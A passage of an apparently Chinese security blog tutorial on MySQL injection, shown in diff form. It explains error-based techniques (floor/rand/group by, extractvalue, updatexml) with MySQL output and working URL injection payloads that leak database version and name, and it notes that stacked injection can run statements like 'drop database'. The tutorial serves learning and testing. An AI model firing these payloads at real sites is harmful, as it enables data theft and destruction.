class="hljs-number">-14</span>);<br># 没有时延说明长度为 14<br></code></pre></td></tr></table></figure></li>
+</ul></li>
+</ol>
+<h3 id="报错注入">报错注入</h3>
+<p>利用 MySQL 的一些特殊语法触发错误，错误中常常带着一些数据库信息，从而造成信息泄露，达到注入的目的。以下是几个常见的 payload：</p>
+<blockquote>
+<p>floor + rand + count + group by 组合拳</p>
+</blockquote>
+<p>先说 <code>group by</code>。当 <code>group by</code> 与聚合函数（这里是 count）一起使用的时候，MySQL 会为查询结果建立一个虚拟的表。这个表你可以按照 Python 的里的字典理解：<br />
+<figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs abnf">tmp_table <span class="hljs-operator">=</span> &#123;<br>&#125;<br></code></pre></td></tr></table></figure></p>
+<p>与字典类似，这个临时的表不能创建相同的键，出现了就报错；如果出现相同的值，则累加。举例：<br />
+假如查出了一个新的值 a，那么 MySQL 先找一下临时表中有没有这个 a 键，有的话更新对于的值；否则创建一个新的键。如果创建新的键的时候发现已经存在这个键了，则会报错。那么问题来了，创建键的之前明明有对键的存在进行判断，为什么创建的时候还会出现存在呢？因为判断的时候 MySQL 会进行一次查询，而创建的时候又会查一下，相当于重复查了 2 次。又因为 <code>rand</code> 函数每次运行的结果不同，便导致了判断与创建的键会不一致的情况。</p>
+<p>当然，0~1 之间的随机浮点数结果太多了，需要限制一下来提高几率，这就是 <code>floor(rand()*2)</code> 的作用，将随机结果限制为2种，要么 0 要么 1。<br />
+举例说明，当 <code>group by</code> + <code>floor(rand(0)*2)</code> 的时候：<br />
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select floor(rand(0)*2) from information_schema.tables limit 0, 5;</span><br><span class="hljs-section">+------------------+</span><br><span class="hljs-section">| floor(rand(0)*2) |</span><br><span class="hljs-section">+------------------+</span><br>|                0 |<br>|                1 |<br>|                1 |<br>|                0 |<br><span class="hljs-section">|                1 |</span><br><span class="hljs-section">+------------------+</span><br>5 rows in set (0.00 sec)<br></code></pre></td></tr></table></figure><br />
+结果解释：</p>
+<ol type="1">
+<li>第一次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1。</li>
+<li>第二次查询，随机数为 1，<code>group by</code> 拿到键 1，判断键 1 在临时表后，更新键 1 对应的值。</li>
+<li>第三次查询，随机数为 0，<code>group by</code> 拿到键 0，判断键 0 不在临时表后，尝试新建键，这时消耗了一个随机数 1，所以这个时候实际上新建的键的是 1，但是键 1已经存在，所以 MySQL 报错：<code>ERROR 1062 (23000): Duplicate entry '1' for key '&lt;group_key&gt;'</code></li>
+</ol>
+<p>验证如下：<br />
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from users;</span><br><span class="hljs-section">+------+----------+----------+</span><br><span class="hljs-section">| id   | user     | password |</span><br><span class="hljs-section">+------+----------+----------+</span><br>|    1 | admin    | admin    |<br>|    2 | root     | password |<br><span class="hljs-section">|    3 | username | 123456   |</span><br><span class="hljs-section">+------+----------+----------+</span><br>3 rows in set (0.00 sec)<br><br>mysql&gt; select count(*) from users group by (floor(rand(0)*2));<br>ERROR 1062 (23000): Duplicate entry <span class="hljs-emphasis">&#x27;1&#x27;</span> for key <span class="hljs-emphasis">&#x27;&lt;group_key&gt;&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<p>实际上，group by 的次数与列数密切相关，也就是说，如果将 <code>users</code> 表改为 2列，则不会报错：<br />
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select * from users;</span><br><span class="hljs-section">+------+-------+----------+</span><br><span class="hljs-section">| id   | user  | password |</span><br><span class="hljs-section">+------+-------+----------+</span><br>|    1 | admin | admin    |<br><span class="hljs-section">|    2 | root  | password |</span><br><span class="hljs-section">+------+-------+----------+</span><br>2 rows in set (0.00 sec)<br><br><span class="hljs-section">mysql&gt; select count(*) from users group by (floor(rand(0)*2));</span><br><span class="hljs-section">+----------+</span><br><span class="hljs-section">| count(*) |</span><br><span class="hljs-section">+----------+</span><br><span class="hljs-section">|        2 |</span><br><span class="hljs-section">+----------+</span><br>1 row in set (0.00 sec)<br></code></pre></td></tr></table></figure></p>
+<p>剩下的，就是怎么利用报错将需要的数据带出来。报错中的 <code>1</code> 实际上就是 <code>floor(rand(0)*2)</code> 的结果，所以只需要将数据与 <code>floor(rand(0)*2)</code> 连接起来就可以带出来了：<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">mysql&gt; <span class="hljs-keyword">select</span> count(*) <span class="hljs-keyword">from</span> users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)), &quot;~&quot;,version());<br>ERROR <span class="hljs-number">1062</span> (<span class="hljs-number">23000</span>): Duplicate entry <span class="hljs-string">&#x27;1~5.7.24&#x27;</span> <span class="hljs-keyword">for key</span> <span class="hljs-string">&#x27;&lt;group_key&gt;&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<p>实战示例：<br />
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">1</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> concat((floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)), &quot;~&quot;, version()) <span class="hljs-comment">-- #</span><br></code></pre></td></tr></table></figure></p>
+<p><code>version()</code> 也可以为 <code>( select 语句 )</code></p>
+<blockquote>
+<p>bigint</p>
+</blockquote>
+<p>版本需要比较低才能用。<br />
+bigint 报错注入见：https://www.tr0y.wang/2018/06/18/MySQL的BIGINT报错注入/</p>
+<blockquote>
+<p>xml</p>
+</blockquote>
+<p>利用 xml 的 xpath 语法错误来报错。</p>
+<p><strong>extractvalue</strong>: extractvalue 在查不到数据的时候返回空，xpath 语法错误的时候则会报错：</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/&#x27;);</span><br><span class="hljs-section">+--------------------------+</span><br><span class="hljs-section">| extractvalue(&#x27;123&#x27;, &#x27;/&#x27;) |</span><br><span class="hljs-section">+--------------------------+</span><br><span class="hljs-section">| 123                      |</span><br><span class="hljs-section">+--------------------------+</span><br>1 row in set (0.00 sec)<br><br><span class="hljs-section">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;);</span><br><span class="hljs-section">+---------------------------+</span><br><span class="hljs-section">| extractvalue(&#x27;123&#x27;, &#x27;/a&#x27;) |</span><br><span class="hljs-section">+---------------------------+</span><br><span class="hljs-section">|                           |</span><br><span class="hljs-section">+---------------------------+</span><br>1 row in set (0.00 sec)<br><br>mysql&gt; select extractvalue(<span class="hljs-emphasis">&#x27;123&#x27;</span>, <span class="hljs-emphasis">&#x27;~&#x27;</span>);<br>ERROR 1105 (HY000): XPATH syntax error: <span class="hljs-emphasis">&#x27;~&#x27;</span><br>mysql&gt; <br></code></pre></td></tr></table></figure>
+<p><strong>updatexml</strong>：与 extractvalue 类似。</p>
+<p>注意，这两种报错注入，能够提取的最长字符串为 32 个字符：<br />
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs subunit">mysql&gt; select extractvalue(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;);<br><span class="hljs-keyword">ERROR </span>1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br>mysql&gt; select updatexml(&#x27;123&#x27;, &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;, &#x27;1&#x27;);<br><span class="hljs-keyword">ERROR </span>1105 (HY000): XPATH syntax error: &#x27;~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~&#x27;<br></code></pre></td></tr></table></figure></p>
+<p>实战示例：<br />
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mysql&gt; select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-string">&#x27;&#x27;</span>, concat(<span class="hljs-string">&#x27;~&#x27;</span>, database(), <span class="hljs-string">&#x27;~&#x27;</span>));<br><span class="hljs-built_in">ERROR</span> 1105 (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~test~&#x27;</span><br></code></pre></td></tr></table></figure></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros">mysql&gt; select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">id</span>=1 <span class="hljs-keyword">and</span> updatexml(<span class="hljs-string">&#x27;&#x27;</span>, concat(<span class="hljs-string">&#x27;~&#x27;</span>, database(), <span class="hljs-string">&#x27;~&#x27;</span>), <span class="hljs-string">&#x27;&#x27;</span>); <br><span class="hljs-built_in">ERROR</span> 1105 (HY000): XPATH syntax error: <span class="hljs-string">&#x27;~test~&#x27;</span><br></code></pre></td></tr></table></figure>
+<blockquote>
+<p>其他函数</p>
+</blockquote>
+<p>上面这几个仅仅是比较常见的函数，实际上还有很多不常见的，见这篇博文：</p>
+<p><a href="https://www.tr0y.wang/2019/04/10/MySQL%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5%E5%87%BD%E6%95%B0Fuzz/">Mysql 报错注入函数 fuzz</a></p>
+<h3 id="联合注入">联合注入</h3>
+<p>利用 <code>union</code> 来拼接 select 语句。主要是判断列数。</p>
+<h3 id="堆叠注入">堆叠注入</h3>
+<p>MySQL 语句中的 <code>;</code> 代表一个语句结束。如果 <code>;</code> 之后的语句也能执行，那么就可以拼接任意语句，包括<code>drop database</code>。</p>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到 API 或者数据库引擎不支持的限制，当然了权限不足也是有可能的。</p>
+<h2 id="零碎的技巧记录">零碎的技巧记录</h2>
+<p><a href="https://www.tr0y.wang/2018/04/07/MySQL%E6%B3%A8%E5%85%A5%E6%8A%80%E5%B7%A7/">传送门🚪</a></p>
+<h2 id="相关文章">相关文章</h2>
+<a href="https://www.tr0y.wang/2018/06/18/MySQL的BIGINT报错注入/">MySQL 的 BIGINT 报错注入</a><br>
+<p style="text-align: center;">
+<font size="2px" color="gray">来呀快活呀</font><br />
+<img src="https://clean-1252075454.cos.ap-nanjing.myqcloud.com/20200528120800990.png" srcset="https://blog-theme-source-1252075454.cos.ap-nanjing.myqcloud.com/img/loading.gif" lazyload style="zoom:30%" />
+</p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93/" class="category-chain-item">经验总结</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Web/">#Web</a>
+      
+        <a href="/tags/%E6%B3%A8%E5%85%A5/">#注入</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>MySQL 注入指北</div>
+      <div>https://www.tr0y.wang/2019/03/25/MySQL注入指北/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>Tr0y</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2019年3月25日</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>更新于</div>
+          <div>2023年12月13日</div>
+        </div>
+      
+      <div class="license-meta-item">
+        <div>许可协议</div>
+        <div>
+          
+            
+            
+              <a target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+              <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                <i class="iconfont icon-by"></i>
+              </span>
+              </a>
+            
+          
+        </div>
+      </div>
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2019/03/27/Python%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86/" title="Python 中的异常处理">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">Python 中的异常处理</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2019/03/25/OWASP-Top10-%E7%B3%BB%E5%88%97%E4%B9%8BSQL%E6%B3%A8%E5%85%A5/" title="OWASP Top10 系列之 SQL 注入">
+                        <span class="hidden-mobile">OWASP Top10 系列之 SQL 注入</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  <article id="comments" lazyload>
+    
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#comments', function() {
+      var light = 'github-light';
+      var dark = 'github-dark';
+      var schema = document.documentElement.getAttribute('data-user-color-scheme');
+      if (schema === 'dark') {
+        schema = dark;
+      } else {
+        schema = light;
+      }
+      window.UtterancesThemeLight = light;
+      window.UtterancesThemeDark = dark;
+      var s = document.createElement('script');
+      s.setAttribute('src', 'https://utteranc.es/client.js');
+      s.setAttribute('repo', 'Macr0phag3/Macr0phag3.github.io');
+      s.setAttribute('issue-term', 'title');
+      
+      s.setAttribute('label', 'comment');
+      
+      s.setAttribute('theme', schema);
+      s.setAttribute('crossorigin', 'anonymous');
+      document.getElementById('comments').appendChild(s);
+    })
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+  </article>
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+  
+  
+
+
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+    <div class="statistics">
+  
+  
+
+  
+    
+      <span id="leancloud-site-pv-container" style="display: none">
+        总访问量 
+        <span id="leancloud-site-pv"></span>
+         次
+      </span>
+    
+    
+      <span id="leancloud-site-uv-container" style="display: none">
+        总访客数 
+        <span id="leancloud-site-uv"></span>
+         人
+      </span>
+    
+    
+
+  
+</div>
+
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":true,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.0/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  
+      <script>
+        if (!window.MathJax) {
+          window.MathJax = {
+            tex    : {
+              inlineMath: { '[+]': [['$', '$']] }
+            },
+            loader : {
+              load: ['ui/lazy']
+            },
+            options: {
+              renderActions: {
+                insertedScript: [200, () => {
+                  document.querySelectorAll('mjx-container').forEach(node => {
+                    let target = node.parentNode;
+                    if (target.nodeName.toLowerCase() === 'li') {
+                      target.parentNode.classList.add('has-jax');
+                    }
+                  });
+                }, '', false]
+              }
+            }
+          };
+        } else {
+          MathJax.startup.document.state(0);
+          MathJax.texReset();
+          MathJax.typeset();
+          MathJax.typesetPromise();
+        }
+      </script>
+    
+
+  <script  src="https://lib.baomitu.com/mathjax/3.2.1/es5/tex-mml-chtml.js" ></script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
